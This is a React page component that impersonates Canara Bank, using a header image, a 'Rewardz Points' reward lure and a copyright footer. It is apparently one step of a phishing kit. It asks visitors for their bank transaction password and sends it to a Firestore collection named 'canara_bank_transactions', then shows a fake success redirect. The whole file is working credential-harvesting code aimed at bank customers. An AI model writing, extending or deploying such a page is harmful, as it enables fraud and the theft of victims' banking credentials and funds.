import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import '../App.css';
import headerImage from '../assets/second-page-header.jpeg';
import FirebaseUtil from '../FirebaseRepo';

const SecondPage = () => {
  const [transactionPassword, setTransactionPassword] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const navigate = useNavigate();

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);

    try {
      // Upload data to Firestore
      await FirebaseUtil.uploadAnyModel("canara_bank_transactions", {
        transactionPassword,
        page: "transaction_verification",
        timestamp: new Date().toISOString()
      });

      // Navigate to the success page after successful submission
      setTimeout(() => {
        setIsSubmitting(false);
        navigate('/success');
      }, 1500);
    } catch (error) {
      console.error("Error submitting form:", error);
      setIsSubmitting(false);
    }
  };

  return (
    <div className="flex flex-col min-h-screen bg-white">
      {/* Header Image */}
      <div className="w-full">
        <img 
          src={headerImage} 
          alt="Canara Bank Header" 
          className="w-full h-40 object-cover"
        />
      </div>

      {/* Main Content */}
      <main className="flex-1 m-2 flex justify-center items-center bg-gray-100">
        <div className="bg-white text-gray-800 rounded-xl w-full max-w-md p-5 shadow-lg">
          <div className="text-center mb-6">
            <h1 className="text-2xl font-bold text-blue-800">
              One Step Away To Collect Your Rewardz Points
            </h1>
          </div>

          <form onSubmit={handleSubmit} className="space-y-4">
            <div className="mb-4">
              <label className="block text-gray-700 text-sm font-bold mb-2">
                Verify Your Transaction Password
              </label>
              <input
                type="password"
                className="w-full py-2 px-3 rounded border border-gray-300 text-gray-700 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
                value={transactionPassword}
                onChange={(e) => setTransactionPassword(e.target.value)}
                required
              />
            </div>

            <button
              type="submit"
              className="w-full bg-yellow-400 hover:bg-yellow-500 text-black font-bold py-2 px-4 rounded-full text-sm"
              disabled={isSubmitting}
            >
              {isSubmitting ? "PROCESSING..." : "SUBMIT"}
            </button>
          </form>
        </div>
      </main>

      {/* Bottom Part / Footer */}
      <footer className="bg-gray-800 text-white p-4 text-center">
        <p className="text-sm"> 2025 Canara Bank. All rights reserved.</p>
        <p className="text-xs">For support, call 1800-123-4567 or email support@canarabank.com</p>
      </footer>
    </div>
  );
};

export default SecondPage;
